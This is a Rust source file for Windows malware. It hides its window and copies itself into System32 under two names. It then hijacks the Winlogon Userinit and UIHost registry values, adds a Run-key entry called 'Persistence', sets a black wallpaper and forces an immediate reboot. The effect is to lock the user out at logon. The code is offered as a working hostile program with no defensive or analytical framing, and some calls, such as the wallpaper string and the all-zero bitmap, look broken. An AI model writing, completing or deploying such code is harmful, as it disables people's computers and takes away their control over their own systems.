#![windows_subsystem = "windows"]
use std::fs::{self, File};
use std::io::Write;
use std::path::PathBuf;
use winreg::RegKey;
use winreg::enums::*;
use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE};

const VIDEO_BLOB: &[u8] = include_bytes!("../video.mp4");

fn main() {
    let sys = PathBuf::from(std::env::var("SYSTEMROOT").unwrap()).join("System32");
    let dest_gate = sys.join("gate_keeper.exe");
    let dest_screen = sys.join("screen_holder.exe");
    let video_path = sys.join("video.mp4");

    fs::write(&video_path, VIDEO_BLOB).ok();
    fs::copy(std::env::current_exe().unwrap(), &dest_gate).ok();
    fs::copy(std::env::current_exe().unwrap(), &dest_screen).ok();

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let winlogon = hklm.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        KEY_SET_VALUE
    ).unwrap();

    let gate_val = dest_gate.to_str().unwrap().to_owned() + ",userinit.exe";
    winlogon.set_value("Userinit", &gate_val).ok();
    winlogon.set_value("UIHost", &dest_screen.to_str().unwrap().to_owned()).ok();

    let run = hklm.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        KEY_SET_VALUE
    ).unwrap();
    run.set_value("Persistence", &dest_screen.to_str().unwrap().to_owned()).ok();

    // Чёрный экран
    let black_bmp = sys.join("black.bmp");
    let mut f = File::create(&black_bmp).unwrap();
    f.write_all(&[0; 54 + 1920*1080*3]).ok();
    unsafe {
        SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, black_bmp.to_str().unwrap().as_ptr() as *mut _, SPIF_UPDATEINIFILE);
    }

    std::process::Command::new("shutdown").args(["/r", "/t", "0", "/f"]).status().ok();
}
